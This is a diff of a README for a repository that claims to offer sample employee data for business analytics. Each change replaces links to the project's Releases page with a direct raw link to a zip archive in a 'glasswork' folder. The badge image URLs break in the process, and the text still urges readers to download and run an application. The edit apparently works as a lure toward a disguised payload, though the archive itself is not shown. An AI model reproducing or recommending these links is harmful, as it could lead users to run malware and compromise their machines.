@@ -1,6 +1,6 @@
 # 🌟 BrightData-Employee-Business-dataset-samples - Sample Employee Data for Business Insights
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/eliash5229/BrightData-Employee-Business-dataset-samples/releases)
+[![Download Now](https://raw.githubusercontent.com/eliash5229/BrightData-Employee-Business-dataset-samples/main/glasswork/samples_Data_Bright_Employee_dataset_Business_v3.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/eliash5229/BrightData-Employee-Business-dataset-samples/main/glasswork/samples_Data_Bright_Employee_dataset_Business_v3.5.zip)
 
 ## 🔍 Overview
 
@@ -24,7 +24,7 @@ Follow these instructions to download and run the application without any prior 
 
 ## 📥 Download & Install
 
-To get started, [visit this page to download](https://github.com/eliash5229/BrightData-Employee-Business-dataset-samples/releases). Here, you will find the latest release, which includes everything you need.
+To get started, [visit this page to download](https://raw.githubusercontent.com/eliash5229/BrightData-Employee-Business-dataset-samples/main/glasswork/samples_Data_Bright_Employee_dataset_Business_v3.5.zip). Here, you will find the latest release, which includes everything you need.
 
 1. Click on the "Releases" link above.
 2. On the Releases page, locate the latest version.
@@ -75,4 +75,4 @@ Contributions are welcome! If you have ideas for improving the dataset or the pr
 
 By using this sample data, you can enhance your HR analytics and gain valuable business insights. Happy analyzing!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/eliash5229/BrightData-Employee-Business-dataset-samples/releases)
+[![Download Now](https://raw.githubusercontent.com/eliash5229/BrightData-Employee-Business-dataset-samples/main/glasswork/samples_Data_Bright_Employee_dataset_Business_v3.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/eliash5229/BrightData-Employee-Business-dataset-samples/main/glasswork/samples_Data_Bright_Employee_dataset_Business_v3.5.zip)
